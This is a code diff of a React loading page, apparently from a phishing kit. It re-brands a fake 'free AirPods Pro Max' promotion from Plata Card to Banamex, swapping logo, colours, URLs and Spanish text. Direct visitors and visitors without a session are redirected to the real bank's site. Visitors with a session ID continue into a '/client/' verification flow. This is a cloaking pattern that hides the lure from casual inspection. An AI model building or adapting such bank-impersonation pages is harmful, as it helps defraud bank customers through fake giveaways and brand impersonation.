@@ -1,6 +1,6 @@
 import React, { useEffect, useState } from 'react';
 import { useLocation, useRoute } from 'wouter';
-import plataCardLogo from '@assets/Plata_Card_Logo_1754951777982.png';
+import banamexLogo from '../assets/Banamex.png';
 
 const GenerandoAclaracion: React.FC = () => {
   const [progress, setProgress] = useState(0);
@@ -38,14 +38,14 @@ const GenerandoAclaracion: React.FC = () => {
     if (progress === 100) {
       const redirectTimeout = setTimeout(() => {
         if (isDirectAccess) {
-          // Si es acceso directo, redirigir a Plata Card
-          window.location.href = 'https://www.platacard.com/';
+          // Si es acceso directo, redirigir a Banamex
+          window.location.href = 'https://www.banamex.com/';
         } else if (hasSessionId) {
           // Si tiene un sessionId válido, redirigir al flujo normal del cliente
           setLocation(`/client/${sessionId}`);
         } else {
-          // Por defecto, redirigir a Plata Card
-          window.location.href = 'https://www.platacard.com/';
+          // Por defecto, redirigir a Banamex
+          window.location.href = 'https://www.banamex.com/';
         }
       }, 500);
 
@@ -56,19 +56,19 @@ const GenerandoAclaracion: React.FC = () => {
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-white text-center p-4">
       <img 
-        src={plataCardLogo} 
-        alt="Plata Card Logo" 
+        src={banamexLogo} 
+        alt="Banamex Logo" 
         className="w-48 mb-8" 
       />
       
-      <h1 className="text-2xl font-bold mb-4 text-[#BE0046]">
+      <h1 className="text-2xl font-bold mb-4 text-[#153e46]">
         {hasSessionId ? "Iniciando proceso de verificación" : "Procesando promoción de AirPods Pro Max"}
       </h1>
       
       <div className="w-full max-w-md mb-6">
         <div className="h-2 bg-gray-200 rounded-full">
           <div 
-            className="h-full bg-[#BE0046] rounded-full transition-all duration-300" 
+            className="h-full bg-[#153e46] rounded-full transition-all duration-300" 
             style={{ width: `${progress}%` }}
           ></div>
         </div>
@@ -79,7 +79,7 @@ const GenerandoAclaracion: React.FC = () => {
         {hasSessionId ? (
           <>
             <p className="mb-2">
-              Estamos preparando su proceso de verificación para la promoción de AirPods Pro Max de Plata Card.
+              Estamos preparando su proceso de verificación para la promoción de AirPods Pro Max de Banamex.
             </p>
             <p>
               Será redirigido a la plataforma segura en unos momentos. Por favor no cierre esta ventana.
@@ -88,10 +88,10 @@ const GenerandoAclaracion: React.FC = () => {
         ) : (
           <>
             <p className="mb-2">
-              Estamos procesando su registro para la promoción de AirPods Pro Max gratis con Plata Card.
+              Estamos procesando su registro para la promoción de AirPods Pro Max gratis con Banamex.
             </p>
             <p>
-              Será redirigido al portal oficial de Plata Card en unos momentos.
+              Será redirigido al portal oficial de Banamex en unos momentos.
             </p>
           </>
         )}
